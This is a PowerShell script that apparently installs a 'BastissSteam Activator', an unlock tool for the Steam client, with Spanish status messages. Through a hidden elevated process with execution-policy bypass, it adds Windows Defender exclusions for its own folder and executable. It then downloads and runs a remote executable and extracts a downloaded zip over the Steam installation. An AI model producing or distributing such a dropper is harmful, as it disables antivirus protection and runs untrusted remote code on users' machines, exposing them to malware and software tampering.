$APP_DIR = Join-Path $env:LOCALAPPDATA 'BastissSteam'
$EXE_PATH = Join-Path $APP_DIR 'BastissSteamActivator2.exe'
$URL_EXE = 'https://github.com/bastisayes/Fixes-steam/releases/download/bastisss/BastissSteamActivator2.exe'
$EXPECTED_HASH = '7075D1F552F592DE8915F34DE73CA7468F67D301BE22E23E9B16BF19F84C95AE'
function New-BsaShortcut {
    try {
        $shell = New-Object -ComObject WScript.Shell
        $lnk = $shell.CreateShortcut((Join-Path ([Environment]::GetFolderPath('Desktop')) 'BastissSteamActivator.lnk'))
        $lnk.TargetPath = $EXE_PATH
        $lnk.WorkingDirectory = $APP_DIR
        $lnk.Description = 'BastissSteam Activator'
        $lnk.Save()
    } catch {}
    try {
        $shell = New-Object -ComObject WScript.Shell
        $lnk = $shell.CreateShortcut((Join-Path ([Environment]::GetFolderPath('Programs')) 'BastissSteam Activator.lnk'))
        $lnk.TargetPath = $EXE_PATH
        $lnk.WorkingDirectory = $APP_DIR
        $lnk.Description = 'BastissSteam Activator'
        $lnk.Save()
    } catch {}
}
if (-not (Test-Path $APP_DIR)) { New-Item -ItemType Directory -Path $APP_DIR -Force | Out-Null }
$needsExcl = $false
try {
    $existing = @()
    try { $existing = @((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath) } catch {}
    if (-not $existing -or $existing.Count -eq 0) { try { $existing = @((Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -ErrorAction SilentlyContinue).PSObject.Properties.Name | Where-Object { $_ -notlike 'PS*' }) } catch {} }
    if ($existing -notcontains $APP_DIR) { $needsExcl = $true }
    elseif ($existing -notcontains $EXE_PATH) { $needsExcl = $true }
} catch { $needsExcl = $false }
$needsKillElevated = $false
$procs = Get-Process -Name 'BastissSteamActivator2' -ErrorAction SilentlyContinue
if ($procs) {
    try { $procs | Stop-Process -Force -ErrorAction Stop; Start-Sleep -Milliseconds 500 } catch { if ($_.Exception.Message -match 'Acceso denegado|Access is denied') { $needsKillElevated = $true } }
    if (Get-Process -Name 'BastissSteamActivator2' -ErrorAction SilentlyContinue) { $needsKillElevated = $true }
}
if ($needsExcl -or $needsKillElevated) {
    $elevCmd = ""
    if ($needsExcl) { $elevCmd += "Add-MpPreference -ExclusionPath '$APP_DIR' -Force; Add-MpPreference -ExclusionPath '$EXE_PATH' -Force; " }
    if ($needsKillElevated) { $elevCmd += "Get-Process -Name 'BastissSteamActivator2' -ErrorAction SilentlyContinue | Stop-Process -Force; Start-Sleep 600; " }
    $elevFile = Join-Path $env:TEMP "bsa_elev_$([guid]::NewGuid().ToString('N')).ps1"
    Set-Content -LiteralPath $elevFile -Value $elevCmd -Encoding UTF8
    $ep = Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$elevFile`"") -PassThru
    $ep.WaitForExit(20000) | Out-Null
    Remove-Item -LiteralPath $elevFile -Force -ErrorAction SilentlyContinue
}
for ($i=0; $i -lt 10; $i++) { if (-not (Get-Process -Name 'BastissSteamActivator2' -ErrorAction SilentlyContinue)) { break }; Start-Sleep -Milliseconds 250 }
$tmp = Join-Path $APP_DIR "bsa_$([guid]::NewGuid().ToString('N')).exe"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $URL_EXE -OutFile $tmp -UseBasicParsing -TimeoutSec 120
$len = (Get-Item -LiteralPath $tmp).Length
if ($len -lt 100000) { Remove-Item $tmp -Force; throw "Descarga incompleta" }
$h = (Get-FileHash $tmp -Algorithm SHA256).Hash
if ($h -ne $EXPECTED_HASH) { Remove-Item $tmp -Force; throw "Hash incorrecto ($h)" }
for ($i=0; $i -lt 10; $i++) { if (-not (Get-Process -Name 'BastissSteamActivator2' -ErrorAction SilentlyContinue)) { break }; Start-Sleep -Milliseconds 250 }
try { if (Test-Path -LiteralPath $EXE_PATH) { Remove-Item -LiteralPath $EXE_PATH -Force -ErrorAction SilentlyContinue }; Start-Sleep -Milliseconds 300; Move-Item -LiteralPath $tmp -Destination $EXE_PATH -Force -ErrorAction Stop }
catch {
    Start-Sleep -Milliseconds 1500
    try { if (Test-Path -LiteralPath $EXE_PATH) { Remove-Item -LiteralPath $EXE_PATH -Force -ErrorAction SilentlyContinue } } catch {}
    try { Move-Item -LiteralPath $tmp -Destination $EXE_PATH -Force -ErrorAction Stop } catch {
        [IO.File]::Copy($tmp, $EXE_PATH, $true)
        Remove-Item $tmp -Force -ErrorAction SilentlyContinue
    }
}
Remove-Item $tmp -Force -ErrorAction SilentlyContinue
New-BsaShortcut
try {
    $patchFlag = Join-Path $env:LOCALAPPDATA "bsmap_parche.flag"
    $isPatched = $false
    try { $isPatched = ((Get-ItemProperty -Path "HKCU:\Software\Bsmap" -Name ParcheInstalado -ErrorAction SilentlyContinue).ParcheInstalado -eq 1) } catch {}
    if (-not $isPatched) { try { $isPatched = ((Get-Content $patchFlag -Raw -ErrorAction SilentlyContinue).Trim() -eq "1") } catch {} }
    if (-not $isPatched) {
        $steamRoot = $null
        try { $steamRoot = (Get-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam" -Name InstallPath -ErrorAction SilentlyContinue).InstallPath } catch {}
        if (-not $steamRoot) { try { $steamRoot = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Valve\Steam" -Name InstallPath -ErrorAction SilentlyContinue).InstallPath } catch {} }
        if (-not $steamRoot) { $steamRoot = "$env:ProgramFiles(x86)\Steam"; if (-not (Test-Path (Join-Path $steamRoot "steam.exe"))) { $steamRoot = "C:\Program Files (x86)\Steamm" } }
        if ($steamRoot -and (Test-Path (Join-Path $steamRoot "steam.exe"))) {
            $wc = New-Object System.Net.WebClient
            $data = $wc.DownloadData("https://github.com/bastisayes/Fixes-steam/raw/main/PARCHENEWw.zip")
            $tmpZip = Join-Path $env:TEMP "patch_$(Get-Random).zip"
            [IO.File]::WriteAllBytes($tmpZip, $data)
            Expand-Archive -Path $tmpZip -DestinationPath $steamRoot -Force -ErrorAction Stop
            Remove-Item $tmpZip -Force -ErrorAction SilentlyContinue
            New-Item -Path "HKCU:\Software\Bsmap" -Force | Out-Null; Set-ItemProperty -Path "HKCU:\Software\Bsmap" -Name ParcheInstalado -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
            [IO.File]::WriteAllText($patchFlag, "1", (New-Object System.Text.UTF8Encoding $false))
        }
    }
} catch {}
Start-Process -FilePath $EXE_PATH
Add-Type -AssemblyName System.Windows.Forms
$n = New-Object System.Windows.Forms.NotifyIcon
$n.Icon = [System.Drawing.SystemIcons]::Information
$n.Visible = $true
$n.ShowBalloonTip(3000, 'BastissSteam Activator', 'El programa se instalo y abrio correctamente.', [System.Windows.Forms.ToolTipIcon]::Info)
Start-Sleep -Seconds 4
$n.Dispose()
